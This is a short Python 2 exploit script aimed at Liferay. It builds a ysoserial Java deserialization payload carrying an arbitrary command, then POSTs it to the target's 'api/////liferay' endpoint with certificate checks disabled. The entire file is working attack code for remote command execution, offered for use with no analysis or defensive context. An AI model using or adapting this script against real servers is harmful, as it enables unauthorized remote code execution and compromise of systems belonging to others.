import requests
import argparse
import subprocess

parser = argparse.ArgumentParser(description='Description of your program')
parser.add_argument('-u','--url', help='Url vulnerability (Example: http://example.com/)', required=True)
parser.add_argument('-y','--ysoserial', help='Path to ysoserial.jar', required=True)
parser.add_argument('-p','--payload', help='Payload in ysoserial (Example: CommonsCollections1)', required=True)
parser.add_argument('-c','--cmd', help='Command to execute', required=True)

args = parser.parse_args()
url = args.url
path_ysoserial = args.ysoserial
payload = args.payload
cmd = args.cmd

command = """java -jar %s %s "%s" """ % (path_ysoserial, payload, cmd)
data = subprocess.check_output(command, shell=True)

headers={
	'Content-Type':'application/x-Java-serialized-object'
}
with open('payload.txt', 'wb') as f:
    f.write(data)
uri = "api/////liferay"
res = requests.post(url + uri, headers=headers,data=data,verify=False)
print "Done exploit url: " + url + uri
